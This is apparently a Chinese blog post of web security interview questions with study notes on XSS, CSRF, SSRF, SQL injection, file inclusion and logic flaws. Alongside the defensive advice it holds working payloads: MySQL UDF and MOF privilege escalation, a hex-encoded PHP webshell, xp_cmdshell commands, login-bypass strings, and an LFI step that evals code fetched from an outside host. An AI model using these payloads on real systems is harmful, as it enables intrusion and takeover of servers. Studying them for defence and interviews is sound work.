---
title: web security interview
pubDatetime: 2017-03-06 15:27:41
tags:
  - interview
  - security
description: Already Archive Before 20230604
---

### 说明

> 下面的题目都是遇到的原题或引申出的题目，答案不保证正确，欢迎有问题告诉我，或者补充

<!--more-->

### 开放题目

#### 对 Web 安全的理解

#### 熟悉的漏洞和防范手段

#### 自己找到过的代码审计问题

#### 平时用什么语言开发

#### 写过什么项目, 什么功能, 解决了什么难题

#### 用什么扫描器

#### 自我介绍

#### 学习了多久 web 安全 学了什么

#### 漏洞挖掘经验

#### 漏洞深入研究经验

#### 实习能来多久

#### 实习的话想干什么

#### 有什么没问到的方面

#### 实习做了什么，就此方面提问

#### 讲讲 web 安全经历

#### 考研吗？为什么

<!--more-->

### MySQL 提权

#### UDF 提权，目录位置

> root
> func 表
> 5.x

1. show variables like '%plugin%';
2. plugin_dir: /usr/bin/mysql/plugin (need rw)
3. uname -a
4. select hex(load_file(‘/pentest/database/sqlmap/udf/mysql/linux/64/lib_mysqludf_sys.so’)) into outfile ‘/tmp/udf.txt';
5. select unhex('7F454C46020...') into dumpfile '/usr/lib/mysql/plugin/mysqludf.so';
6. nm -D /usr/lib/mysql/plugin/mysqludf.so
7. create function sys_eval returns string soname "mysqludf.so";
8. select sys_eval('whoami');

#### mof 提权，需要写目录上传权限

```
#pragma namespace("\\\\.\\root\\subscription")

instance of __EventFilter as $EventFilter
{
    EventNamespace = "Root\\Cimv2";
    Name  = "filtP2";
    Query = "Select * From __InstanceModificationEvent "
            "Where TargetInstance Isa \"Win32_LocalTime\" "
            "And TargetInstance.Second = 5";
    QueryLanguage = "WQL";
};

instance of ActiveScriptEventConsumer as $Consumer
{
    Name = "consPCSV2";
    ScriptingEngine = "JScript";
    ScriptText =
    "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user [username] [password] /add\")";
};

instance of __FilterToConsumerBinding
{
    Consumer   = $Consumer;
    Filter = $EventFilter;
};

```

```sql
select load_file('C:/wmpub/nullevt.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'
```

---

### XSS

#### XSS 一般问题

> 反射型 XSS：依赖用户行为触发

Hacker——发现存在反射 XSS 的 URL——根据输出点的环境构造 XSS 代码——进行编码、缩短(可有可无，是为了增加迷惑性)——发送给受害人——受害打开后，执行 XSS 代码——完成 hacker 想要的功能(获取 cookies、url、浏览器信息、IP 等等)

> 存储型 XSS：自动触发

储蓄型 XSS 其实和反射型 XSS 差不多，只是储蓄型把数据保存到服务端，而反射型只是让 XSS 游走在客户端上。下面是我在某处网站上检测到的储蓄 XSS

> DOMXSS：依赖用户行为，DOM 发生变化, 也有反射存储

DOM XSS 是基于在 js 上的。而且他不需要与服务端进行交互，像反射、储蓄都需要服务端的反馈来构造 xss，因为服务端对我们是不可见的

    4. flash XSS：

> 对抗 XSS

    1. HTTP Only/ip绑定cookie
    2. 过滤输入(filter,服务端，htmkentities,htmlspecialchars,)和输出(转义、编码)
    3. 设置新的Cookie标志?
    4. 设置一个HTTP标头?
    5. (dom)输出到script时，做jsencode，document.write时，如果输出到事件或脚本，做jsencode，如果输出到html内容或属性，做htmlencode

> 技巧

    1. 字符编码绕过
    2. 注释符打通
    3. base标签
    4. 存储嵌套一个反射型

> xss 位置

    1. HTML标签中，如<script><a>
    2. HTML属性中<x src>
    3. 在存在的<script>中拼接
    4. 事件中onclick,onerror
    5. CSS中，@import, url(), expression
    6. URL
    7. 输出点document.write, document.writeln, xxx.innerHTML, xxx.outerHTML, innerHTML.replace, document.attachEvent, window.attachEvent, document.location.replace, document.location.assign
    8. 输入点input,window.location(href,hash), window.name, document.referer, document.cookie, localstorage, XMLHttpRequest返回值

#### XSS 能用来干什么

    1. 获取cookie
    2. GET/POST操作
    3. 钓鱼（伪造一个登录框）
    4. 获取浏览器（UA、插件）和系统信息（OS、控件）
    5. css history hack
    6. 结合其他环境（java）获取信息，例如ip
    7. WORM:感染+传播
    8. xss shell: 结合csrf
    9. xss: 攻击客户端(js爆破缓存目录、下载、执行木马)

#### DOM XSS 原理和防范

    1. 输出到script时，做jsencode，document.write时，如果输出到事件或脚本，做jsencode，如果输出到html内容或属性，做htmlencode

#### 如何保证 DOM 不被修改，防止 DOM XSS

    1. document.createTextNode
    2. 过滤输出数据
    3. 在脚本中将不可信数据插入到HTML前，先执行HTML转义、然后执行JS转义
    4. 在脚本中将不可信数据插入到HTML属性前，先执行JS转义
    5. 将不可信数据插入到事件处理句柄 和 JS 代码中，一定要小心（setTimeout, setInterval, new Function）
    6. 将不可信数据插入到CSS属性前先执行JS转义
    7. 将不可信数据插入到URL属性前，先执行URL转义，后执行JS转义

#### 存储型 XSS 原理和防范

#### XSS 防御策略

    1. 不可信的数据应该做为只显示的文本，不应该作为 JS代码或者标签被执行
    2. 对不可信数据总是采用JS转义，并添加引号的方法，让其出现在JS代码中
    3. 避免使用HTML渲染方法
    4. DOM中的URL转义需要注意字符集问题
    5. HTML渲染HTML转义，后执行JS转义
    6. eval() 不可信
    7. innerText比较安全

#### 如何快速发现可能 XSS 的位置

1. 测试输入点的特殊字符过滤
2. xssfuzz
3. HTTP Referer
4. User-Agent
5. Cookie
6. 表单
7. URL 参数
8. URL 末尾
9. 跳转型 xss

#### XSS 过滤放在输入还是输出好

1. 都要有，防止入库和防止生效

#### 如何绕过 HTTP Only

    1. 利用中间件报错、Apache报错等

#### XSS worm 原理

1. Ajax
2. 攻击者发现目标网站存在 XSS 漏洞，并且可以编写 XSS 蠕虫。
3. 利用宿主 （如博客空间） 作为传播源头进行 XSS 攻击。
4. 当其他用户访问被感染的空间时，XSS 蠕虫就继续感染。

#### XSS 绕过同源策略，获取子站、另外网站的信息

1. Java 同源策略绕过，同 IP
2. XXE Injection
3. Adobe Flash 同源策略绕过：allow-access-from
4. Silverlight http=https
5. document.domain(跨子域)
6. JSONP
7. CORS
8. window.name 跨域
9. window.postMessage 跨域传送
10. crossdomain.xml
11. location.hash
12. WebSocket

### Cookie

#### Cookie 有哪些参数，Secure 什么用

1. secure： 仅在 HTTPS 使用
2. HTTP Only： 防止客户端(js)访问
3. SameSite=Lax(仅 POST 禁止)/Strict(GET 也不允许跨域传送 Cookie)

### CSRF

#### 原理

参数可以被攻击者预测

1. 用户 C 打开浏览器，访问受信任网站 A，输入用户名和密码请求登录网站 A； 2.在用户信息通过验证后，网站 A 产生 Cookie 信息并返回给浏览器，此时用户登录网站 A 成功，可以正常发送请求到网站 A；
2. 用户未退出网站 A 之前，在同一浏览器中，打开一个 TAB 页访问网站 B；
3. 网站 B 接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点 A；
4. 浏览器在接收到这些攻击性代码后，根据网站 B 的请求，在用户不知情的情况下携带 Cookie 信息，向网站 A 发出请求。网站 A 并不知道该请求其实是由 B 发起的，所以会根据用户 C 的 Cookie 信息以 C 的权限处理该请求，导致来自网站 B 的恶意代码被执行。

#### CSRF 如何不带 Referer 访问,绕过 Referer

1. 跨协议时 referer 为空,例如 data://

```html
 <iframe src="data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==">

base64为<form method=post action=http://a.b.com/d><input type=text name='id' value='123'/></form><script>document.forms[0].submit();</script>
```

#### CSRF 防御

(不完全解决)

    当用户关闭页面时，清除session；设置低时效session
    (不能解决打开标签页后再打开伪造请求页造成的csrf)

(不完全解决)

    检查referer是否是本站
    (不能解决跨协议空referer)

(不完全解决/简单)

    当表单提交时向form增加一个临时cookie字段
    (此cookie在前端生成，因此会被破解)

(仅防止表单提交)

    参考django的csrf_token，保证请求来源于本页
    (不能防止无表单获取/token)

(复杂)

    对每个敏感信息获取请求增加验证码

(防止 JSON HiJacking)

    在json数据头部加入while(1)

(HTTP-Headers)

    在http头/协议层添加token验证

1. token 不能放在 url 中(被 referer 泄露);token 必须随机;token 一次性有效
2. referer 不可能解决问题，因为必须保证空 referer 可以访问，否则无法直接访问主页，但是跨协议访问时会造成空 referer
3. 可以将安全认证和处理模块独立，做在外层
4. 可以结合多个解决方案
5. 在 1.4.3 中可以使用后端随机生成的 cookie 字段名
6. 在 1.4.6 中，浏览器可以去掉 json 文件违规的 while(1)，而对 hacker 可能会造成脚本卡死
7. 服务端配置缺少 Access-Control-Allow-Headers

---

### SSRF

#### 原理

很多 web 应用都提供了从其他的服务器上获取数据的功能。使用用户指定的 URL，web 应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的 web 应用作为代理攻击远程和本地的服务器。这种形式的攻击称为服务端请求伪造攻击

如果应用程序对用户提供的 URL 和远端服务器返回的信息没有进行合适的验证和过滤，就可能存在这种服务端请求伪造的缺陷

#### 挖掘

> 从 WEB 功能上寻找

1. 分享：通过 URL 地址分享网页内容
2. 转码服务：通过 URL 地址把原地址的网页内容调优使其适合手机屏幕浏览
3. 在线翻译：通过 URL 地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等
4. 图片加载与下载：通过 URL 地址加载或下载图片
5. 图片、文章收藏功能
6. 未公开的 api 实现以及其他调用 URL 的功能

> 从 URL 关键字中寻找

1. share/wap/url/link/src/source/target/u/3g/display/sourceURl/imageURL/domain

> SSRF 漏洞的验证

1. 基本判断（排除法）(URL 和看请求)
2. 实例验证

#### SSRF 漏洞中 URL 地址过滤的绕过

1. http://www.baidu.com@10.10.10.10与http://10.10.10.10 请求是相同的
2. ip 地址转换成进制来访问

#### 利用方式

1. 可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息

2. 攻击运行在内网或本地的应用程序（比如溢出）

3. 对内网 web 应用进行指纹识别，通过访问默认文件实现

4. 攻击内外网的 web 应用，主要是使用 get 参数就可以实现的攻击（比如 struts2，sqli 等）

5. 利用 file 协议读取本地文件等

### SQL 注入

#### 类型

    1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。

    2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。

    3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。

    4、联合查询注入，可以使用union的情况下的注入。

    5、堆查询注入，可以同时执行多条语句的执行时的注入。

#### 原理

所谓 SQL 注入，就是通过把 SQL 命令插入到 Web 表单 提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。具体来说，它是利用现有应用程序，将（恶意）的 SQL 命令注入到后台数据库引擎执行的能力，它可以通过在 Web 表单中输入（恶意）SQL 语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行 SQL 语句

① 不当的类型处理；② 不安全的 数据 库配置；③ 不合理的查询集处理；④ 不当的错误处理；⑤ 转义字符处理不合适；⑥ 多个提交处理不当

1. 用户输入
2. 后端处理输入数据，构建 sql 语句
3. 提交给 DBMS 执行 sql 代码
4. 记录运行状态和结果，返回后端
5. 后端判断
6. 前端反馈

#### sqlmap 为什么讲注入分类

区别只给出有或无

#### SQLI 能用来干什么

1. 绕过验证
2. 写 shell
3. dump 数据
4. 执行系统命令

#### SQLI 思路，首先测试什么

    类型
    过滤字符
    waf

    报错：单引号 注释(--, #, /*comment*/, /*!mysql*/, ), 除0, 类型错误
    堆查询: 支持: asp/asp.net/php + mssql    php + postgreSQL
           不支持: php + mysql, asp/asp.net/php/java + access, java + oracle
    IF:
        mysql: SELECT IF (1=1,'true','false')
        mssql: IF (1=1) SELECT 'true' ELSE SELECT 'false'

    16hex:
        SELECT CHAR(0x66)(S)
        SELECT 0x5045(M) (这不是一个整数，而会是一个16进制字符串）
        SELECT 0x50 + 0x45(M) (现在这是整数了)

#### MySQL 和 SQLServer 注入时的区别

MSSQL 基本表`master, msdb, mssqlweb, empdb, model`

> 库名

```sql
select group_concat(distinct table_name) from information_schema.columns where table_schema=database()


select name from master.dbo.sysdatabases where dbid=1 union select name from yourdatabasename.dbo.sysobjects where xtype=char(85) and name not in (select top XX name from yourdatabasename.dbo.sysobjects where xtype=char(85))--
```

> 获得表段的总序号（与 id 不同）

`union select id from yourdatabasename.dbo.sysobjects where xtype=char(85) and name not in (select top XX name from yourdatabasename.dbo.sysobjects where xtype=char(85))--
`

> 根据表的序号一个个列出字段的名字

`union select name from yourdatabasename.dbo.syscolumns where ID=2073058421 and name not in (select top XX name from yourdatabasename.dbo.syscolumns where ID=2073058421 )--
`

#### PostgreSQL

```
union select datname from pg_database order by 11    #猜字段
and (select length(current_database())) between 0,30 　　　　　　#判断数据库长度
and(select ascii(substr(current_database(),1,1))) between 0,64　　#判断数据库名的第１位是否是在０,64的ascii码之间。
select relname from pg_stat_user_tables limit 1 offset n;
and(select count(*) from pg_stat_user_tables) between 0,64　　#判断数据库表数
and(select length(relname) from pg_stat_user_tables limit 1 offset 0) between 0,64　　#判断数据库表第一个表的长度
and(select ascii(substr(relname,1,1)) from pg_stat_user_tables limit 1 offset 0) between 0,64　　#判断数据库第一张表的第一个字符
```

#### rand(0)\*2 报错原理

`select count(*),concat((select database()),floor(rand(0)*2))a from information_schema.tables group by a`

`floor(rand(0)*2):011011011`

`插入相同值, 第二次计算不同: 保证在开始的查询结果中, 不能让虚表中存在0, 1键值`

1. 首先建立了一个虚表

2. 取第一条数据，执行 floor(rand(0) \* 2)，结果为 0（**第一次计算**），查询虚表，发现键值 0 不存在，在进行一次计算，结果为 1（**第一次插入**），插入到表中；

3. 取出第二条数据，执行 floor(rand(0) _ 2)，结果为 1（**第二次计算**），查询虚表，记录存在，直接 count(_)加一；

4. 取出第三条数据，执行 floor(rand(0) \* 2)，结果为 0（**第三次计算**），查询虚表，发现不存在键值 0，在进行一次计算，结果 1(**第二次插入**)，插入到虚表中作为虚表的主键，与之前的 1 冲突，这时候就会报错了。

#### SQLI 如何写 shell

> MySQL

    select 0x3c3f706870206576616c28245f504f53545b277a275d293b3f3e,2,3,4 from mysql.user into outfile '/var/www/html/z.php';

1. 需要知道 Web 目录的绝对路径
2. 需要 mysql 用户有 file 权限，file 权限限制在 MySQL 服务器上读写文件。grant file on _._ to root@localhost
3. 因为执行时以 mysql 用户去执行，所以 mysql 用户需要有 Web 目录的写权限
4. 有代码执行位置(可控位置)

#### SQLI 单引号'被过滤怎么办

    编码 unicode hex
    GBK
    `
    函数 char

    有很多使用字符串的方法，但是这几个方法是一直可用的。使用CHAR()(MS)和CONCAT()(M)来生成没有引号的字符串
    0x457578 (M) - 16进制编码的字符串
    SELECT 0x457578
    这在MySQL中会被当做字符串处理
    在MySQL中使用16进制字符串的一个简单方式： SELECT CONCAT('0x',HEX('c:\\boot.ini'))
    在MySQL中使用CONCAT()函数： SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77)) (M)
    这会返回'KLM'
    SELECT CHAR(75)+CHAR(76)+CHAR(77) (S)
    这会返回'KLM'

    eg:
        M:SELECT LOAD_FILE(0x633A5C626F6F742E696E69)

#### 绕过登陆界面(SMO+)

    SQL注入101式(大概是原文名字吧？),登陆小技巧
    admin' --
    admin' #
    admin'/*
    ' or 1=1--
    ' or 1=1#
    ' or 1=1/*
    ') or '1'='1--
    ') or ('1'='1--
    ....
    以不同的用户登陆 (SM*) ' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--
    **旧版本的MySQL不支持union*

#### 绕过 MD5 哈希检查的例子(MSP)

    用户名：admin

    密码：1234 ' AND 1=0 UNION ALL SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055
    其中81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)

#### MySQL 字符串连接

    +(S)
    SELECT login + '-' + password FROM members
    || (*MO)
    SELECT login || '-' || password FROM members
    *关于MySQL的"||" 这个仅在ANSI模式下的MySQL执行，其他情况下都会当成'逻辑操作符'并返回一个0。更好的做法是使用CONCAT()函数。
    CONCAT(str1, str2, str3, ...)(M)
    连接参数里的所有字符串 例：SELECT CONCAT(login, password) FROM members

#### 使用 HAVING 来探测字段名(S)

    ' HAVING 1=1 --
    ' GROUP BY table.columnfromerror1 HAVING 1=1 --
    ' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 --
    ……
    ' GROUP BY table.columnfromerror1, columnfromerror2,columnfromerror(n) HAVING 1=1 --

#### 在 SELECT 查询中使用 ORDER BY 探测字段数(MSO+)

    通过ORDER BY来探测字段数能够加快union注入的速度。
    ORDER BY 1--
    ORDER BY 2--
    ……
    ORDER BY N--
    一直到它报错为止，最后一个成功的数字就是字段数。

#### 数据类型、UNION、之类的

    经常给UNION配上ALL使用，因为经常会有相同数值的字段，而缺省情况下UNION都会尝试返回唯一值(records with distinct)
    如果你每次查询只能有一条记录，而你不想让原本正常查询的记录占用这宝贵的记录位，你可以使用-1或者根本不存在的值来搞定原查询（前提是注入点在WHERE里）。
    在UNION中使用NULL，对于大部分数据类型来说这样都比瞎猜字符串、日期、数字之类的来得强
    盲注的时候要小心判断错误是来自应用的还是来自数据库的。因为像ASP.NET就经常会在你使用NULL的时候抛出错误（因为开发者们一般都没想到用户名的框中会出现NULL）

#### 获取字段类型

    ' union select sum(columntofind) from users-- (S)

    Microsoft OLE DB Provider for ODBC Drivers error '80040e07' [Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a **varchar** data type as an argument. 如果没有返回错误说明字段是数字类型
    同样的，你可以使用CAST()和CONVERT()

    SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL--
    11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –-
    没报错 - 语法是正确的。 这是MS SQL Server的语法。 继续。
    11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 –-
    没报错 – 第一个字段是integer类型。
    11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 --
    报错 – 第二个字段不是integer类型
    11223344) UNION SELECT 1,’2’,NULL,NULL WHERE 1=2 –-
    没报错 – 第二个字段是string类型。
    11223344) UNION SELECT 1,’2’,3,NULL WHERE 1=2 –-
    报错 – 第三个字段不是integer
    ……
    Microsoft OLE DB Provider for SQL Server error '80040e07' Explicit conversion from data type int to image is not allowed.

    你在遇到union错误之前会先遇到convert()错误，所以先使用convert()再用union

#### 有用的函数、信息收集、内置程序、大量注入笔记

    -->@@version(MS)
    数据库的版本。这是个常量，你能把它当做字段来SELECT，而且不需要提供表名。同样的你也可以用在INSERT/UPDATE语句里面，甚至是函数里面。

    INSERT INTO members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10)

    -->文件插入(Bulk Insert)(S)

    把文件内容插入到表中。如果你不知道应用目录你可以去读取IIS metabase file(仅IIS 6)(%systemroot%\system32\inetsrv\MetaBase.xml)然后在里面找到应用目录。

    新建一个表foo(line varchar(8000))
    BULK INSERT foo FROM 'c:\inetpub\wwwroot\login.asp'
    DROP了临时表，重复另一个文件

    -->BCP(S)

    写入文件。这个功能需要登录 bcp "SELECT * FROM test..foo" queryout c:\inetpub\wwwroot\runcommand.asp -c -Slocalhost -Usa -Pfoobar

    -->SQL Server的VBS/WSH(S)

    由于ActiveX的支持，你能在SQL Server中使用VBS/WSH

    declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL, 'notepad.exe'

    Username: '; declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL, 'notepad.exe' --

    -->执行系统命令，xp_cmdshell(S)

    众所周知的技巧，SQL Server 2005默认是关闭的。你需要admin权限

    EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'

    用ping简单的测试一下，用之前先检查一下防火墙和嗅探器。

    EXEC master.dbo.xp_cmdshell 'ping '

    如果有错误，或者union或者其他的什么，你都不能直接读到结果。

    -->SQL Server中的一些特殊的表(S)

    Error Messages

    master..sysmessages

    Linked Servers

    master..sysservers

    Password (2000和2005版本的都能被破解，这俩的加密算法很相似)

    SQL Server 2000: masters..sysxlogins

    SQL Server 2005 : sys.sql_logins

    -->SQL Server的其它内置程序(S)

    命令执行 (xp_cmdshell)

    exec master..xp_cmdshell 'dir'

    注册表操作 (xp_regread)

    xp_regaddmultistring
    xp_regdeletekey
    xp_regdeletevalue
    xp_regenumkeys
    xp_regenumvalues
    xp_regread
    xp_regremovemultistring
    xp_regwrite

    exec xp_regread HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet \Services\lanmanserver\parameters', 'nullsessionshares' exec xp_regenumvalues HKEY_LOCAL_MACHINE, 'SYSTEM \CurrentControlSet \Services\snmp\parameters\validcommunities'

    管理服务(xp_servicecontrol)

    媒体(xp_availablemedia)

    ODBC 资源 (xp_enumdsn)

    登录 (xp_loginconfig)
    创建Cab文件 (xp_makecab)
    域名列举 (xp_ntsec_enumdomains)
    杀进程 (need PID) (xp_terminate_process)

    新建进程 (实际上你想干嘛都行)

    sp_addextendedproc ‘xp_webserver’, ‘c:\temp\x.dll’ exec xp_webserver

    写文件进UNC或者内部路径 (sp_makewebtask)

#### 宽字节注入原理，在哪里编码，如何防范

1. GBK 的 php， Addslashes 在'前加了 0x5c 与前一个字节拼接成了一个字，导致 0x27 落单
2. MySQL 存储的字符集 字段>表>库>服务器
3. PHP 作为客户端连接 MySQL 时，这个字符集就是 PHP 文件默认的编码
4. character_set_client 和 character_set_connection 不同导致问题

> 指定三个字符集（客户端、连接层、结果集）都是 GBK 编码%df%27->(addslashes)->%df%5c%27->(GBK)->运’
>
> 使用 set names UTF-8 指定了 UTF-8 字符集，并且也使用转义函数进行转义。有时候，为了避免乱码，会将一些用户提交的 GBK 字符使用 iconv 函数（或者 mb_convert_encoding）先转为 UTF-8，然后再拼接入 SQL 语句 e55c27====(addslashes)====>e55c5c5c27====(iconv)====>e98ca65c5c27 (e55c 转为 UTF-8 为 e98ca6)
>
> 使用 iconv 进行字符集转换，将 UTF-8 转为 GBK，同时，set names 字符集为 GBK。提交%e9%8c%a6 即可。
> 这个情景的大前提是先编码后转义: e98ca6====(iconv)=====>e55c=====(addslashes)====>e55c5c

    修复
    （1）使用mysql_set_charset(GBK)指定字符集
    （2）使用mysql_real_escape_string进行转义
    mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集，不会出现前面e5和5c拼接为一个宽字节的问题，但是这个“当前字符集”如何确定呢？
    就是使用mysql_set_charset进行指定。
    上述的两个条件是“与”运算的关系，少一条都不行

> gb2312 编码的取值范围。它的高位范围是 0xA1~0xF7，低位范围是 0xA1~0xFE，而\是 0x5c

> 解决：character_set_client 设置为 binary（二进制)

#### SQLI 中 update 怎么利用

1. left join

#### SQLI 绕过 WAF 思路

    1. 大小写混合
    2. 替换关键字 (一次正则)
    3. 使用编码(URL编码/十六进制编码/Unicode编码/)
    4. 使用注释(//, -- , /**/, #, --+,--  -, ;，--a),内联注释/!**/只有MySQL能识别
    5. 等价函数与命令()
    6. 特殊符号 `(+-.可作连接,@定义变量,)
    7. HTTP参数控制(HPP)
    8. 缓冲区溢出

#### MySQL 有哪些表，有什么用

> mysql 库

1. user：
2. db：
3. table_priv:
4. columns_priv:

user 表身份： Host + User + Password

权限：user-all > db > tables_priv > columns_priv

插件 plugin

> 两个视图库

1. information_schema
2. performance_schema

#### SQL 注入防御

1. 只要是有固定格式的变量，在 SQL 语句执行前，应该严格按照固定格式去检查，确保变量是我们预想的格式
2. 过滤特殊符号
3. 绑定变量，使用预编译语句

### LFI

#### LFI 姿势

> http://192.168.1.101/bWAPP/rlfi.php?language=lang_en.php&action=go into 192.168.1.101/bWAPP/flfi.php?language=/etc/passwd
>
> %00 ?
>
> 4096
>
> http://192.168.1.101/bWAPP/rlfi.php?language=php://filter/read=convert.base64-encode/resource=/etc/passwd > http://192.168.1.101/bWAPP/rlfi.php?language=php://input&cmd=ls

```php
<？php system（$ _ GET ['cmd']）; ？>
```

> use exploit/multi/script/web_delivery, 使用 set payload windows/meterpreter/reverse_tcp，php 的 cmd=php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.0.104:8081/xxxxx'))";

```php
<？php system（$ _ GET ['cmd']）; ？>
```

> http://192.168.1.102/dvwa/vulnerabilities/fi/?page=proc/self/environ

```php
Useragent: <？php system（$ _ GET ['cmd']）; ？>
```

> 然后访问 192.168.1.8/lfi/lfi.php?file=/var/www/apachae2/access.log&cmd=id

### 指纹

#### Web 指纹有哪些

1. API：Wappalyzer API
2. 页面关键字 Powered by
3. 特殊文件名/文件 hash/robots
4. 文件标签结构
5. response

#### 如何获取大量指纹信息

1. 开源 API
2. 爬虫

#### 指纹擦除

1. burp : Proxy——>Options”中的“Match and Replace

#### 工具扫描器具有的指纹信息

```python
Acunetix Web Vulnerability Scanner：
        http headers:
            Acunetix-Aspect
            Acunetix-Aspect-Password
            Acunetix-Aspect-Queries
        params:
            acunetix_wvs_security_test
        url:
            /acunetix-wvs-test-for-some-inexistent-file
        cookie params:
            acunetixCookie
    HP WebInspect:
        http headers:
            X-WIPP
            X-RequestManager-Memo
            X-Request-Memo
            X-Scan-Memo
        cookie params:
            CustomCookie
    Netsparker:
        params:
            netsparker
```

### 逻辑漏洞

#### 测试一般流程

1. 首先尝试正常密码找回流程，选择不同找回方式，记录所有数据包
2. 分析数据包，找到敏感部分
3. 分析后台找回机制所采用的验证手段
4. 修改数据包验证推测

#### 身份认证

1. 暴力破解/弱加密/固定 phpsessid/可破解 cookie

#### 业务一致性

1. 手机号/id/邮箱/订单号篡改

#### 业务数据篡改

1. 金额/商品数量/数量限制/js 修改

#### 业务授权

1. 未授权访问/越权访问

#### 用户凭证暴力破解

1. 纯数字验证(4/6 位)不失效和限制次数

#### 返回凭证

1. url 返回验证码及 token

#### 密码找回凭证在页面中

#### 返回短信验证码

#### 邮箱弱 token

1. 时间戳 md5

#### 用户名 & 服务器时间

1. 在重置密码链接改用户名

#### 用户凭证有效性

1. 验证码和手机号未关联
2. 邮件中的 username 未验证
3. 步骤缺乏中间验证

#### 邮箱 token

1. 没起关联作用

#### 重置密码 token

1. token 绑定问题

#### 重新绑定

1. 越权绑定手机号

#### 邮箱绑定

1. 更改找回密码页面 uid 导致此 id 被自己的忘记密码机制修改

#### 服务器验证

1. 最终提交时客户端确定了 uid

#### 服务器验证可控内容

1. cookie 内的 id
2. 网页返回了密文

#### 服务器验证验证逻辑为空

1. 验证信息永真

#### 用户身份验证

1. 验证码和手机号没绑定

#### 账号与邮箱账号的绑定

1. 重新发送邮件未做绑定验证

#### 找回步骤

1. 跳过验证步骤、找回方式，直接到设置新密码页面

#### 本地验证

1. 在本地验证服务器的返回信息，确定是否执行重置密码，但是其返回信息是可控的内容，或者可以得到的内容

#### 发送短信等验证信息的动作在本地进行，可以通过修改返回包进行控制

#### 注入

1. username

#### Token 生成

1. 找回密码 token 被其他人使用

#### 注册覆盖

#### session 覆盖

1. 第一个找回密码链接可以覆盖同浏览器第二个找回密码请求

### HTML5

#### HTML5 安全

1. `<iframe sandbox>` 独立同源策略: 不允许脚本执行、表单提交、插件加载、访问其他浏览对象
2. `<video onloadedmetdata='' ondurationchanged='' ontimeupdate=''> </video>`
3. `<a rel='noreferrer'>` 同样还有`<area>`
4. HTTP Headers: Origin
5. postMessage(绕过 sandbox)
6. Web Storage(存 xss payload)

#### HTML5 的新安全策略

### 扫描器

#### 扫描器扫不出来的漏洞

1. 逻辑漏洞等需要人为参与的
2. 无法绕过的验证措施

#### xssFuzzing

#### 如何做扫描器

#### 创宇、wooyun 等扫描器的原理，为什么这么设计

### 整体思路

#### 企业安全应急响应中，如何获取 APP 指纹

#### 如何日掉一个网站，思路

#### 如何进行代码审计

#### 只有后台如何渗透

#### 如何社工一个企业的员工信息

#### 如何获得一个域名的邮箱列表

#### WebServer 最重要的是什么/流程

#### 企业安全

#### 追踪溯源

#### 给写 PHP 的人安全建议

1. 不要反序列化任何用户数据
2. 不要使用==
3. display_error = Off

#### PHP 安全建议

1. 绝不要信任外部数据或输入
2. 用户输入进行清理的一个简单方法是，使用正则表达式来处理它(规则长度)
3. 禁用那些使安全性难以实施的 PHP 设置: register_globals
4. 如果不能理解它, 就不能保护它
5. 使用预编译(php 5.3.6 以前版本中，并不支持 DSN 中的 charset 选项，所有绑定的变量均是以 ascii 字节进行转义的)，使用 mysql_real_escape_string()(5.5)
6. 使用 is_numeric()
7. 检查用户输入长度
8. 防止十六进制字符串
9. 从用户输入中清除 HTML 标记
10. token、验证码
11. 使用 filter_var 和 filter_input 等过滤器
12. 打开/etc/php.ini 文件, 查找到 disable_functions, 添加需禁用的函数名, 如下:
    phpinfo,passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status
13. 数据库子集 utf8mb4

#### 如何知道 WAF 信息

1.  Cookie 值
2.  HTTP 响应头
3.                HTML特殊字符串
4.  特定 src 引用
5.  404/200 页

#### 如何收集子域名

1. 枚举，A 记录对比
2. DNS 查询
3. 循环爆破
4. 前缀后缀处理
5. SSL 证书
6. 网站爬虫
7. 域传送漏洞
8. 搜索引擎
9. crossdomain.xml
10. IP 反查

> 防御

1. 泛解析？

### 协议

#### 同源策略，为什么有它

1. 同协议端口域名
2. 保护当前网站资源和数据

#### WebSocket

#### DNS 协议在哪一层，什么时候用 TCP

1. 应用层
2. 区域传送 TCP、UDP 最长 512 字节,使用 TCP、同步(大量数据)

#### 网络协议脆弱性

[PDF](http://kjgcdx.ijournal.cn/ch/reader/create_pdf.aspx?file_no=20020414&year_id=2002&quarter_id=4&falg=1)

> TCP/IP

